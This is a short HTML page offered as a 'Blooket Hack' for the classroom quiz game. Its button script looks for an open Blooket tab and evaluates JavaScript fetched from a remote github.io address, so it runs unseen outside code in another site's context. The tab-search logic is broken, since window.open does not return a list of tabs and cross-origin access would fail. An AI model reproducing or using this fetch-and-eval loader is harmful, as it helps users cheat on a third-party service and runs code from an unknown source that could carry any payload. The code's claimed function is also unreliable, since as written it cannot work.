<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blooket Hack</title>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
            margin-top: 50px;
        }
        button {
            background-color: #28a745;
            color: white;
            padding: 15px;
            font-size: 18px;
            border: none;
            cursor: pointer;
            border-radius: 8px;
        }
        button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <h1>🚀 Blooket Hack</h1>
    <p>Click the button below to run the hack in an already open Blooket tab.</p>
    <button onclick="runHack()">🚀 Run Hack in Blooket</button>

    <script>
        function runHack() {
            let blooketTab = null;

            // Ищем открытую вкладку с Blooket
            let tabs = window.open('', '_self');
            for (let w of tabs) {
                if (w.location.hostname.includes('blooket.com')) {
                    blooketTab = w;
                    break;
                }
            }

            if (!blooketTab) {
                alert("❌ No open Blooket tab found! Open Blooket first and try again.");
                return;
            }

            // Загружаем и выполняем хак в открытой вкладке Blooket
            blooketTab.eval(`
                fetch('https://vasiliy809.github.io/blooket-hacks/hack.js')
                .then(response => response.text())
                .then(eval)
                .catch(error => alert('❌ Hack failed: ' + error));
            `);

            alert("✅ Hack activated in Blooket!");
        }
    </script>
</body>
</html>
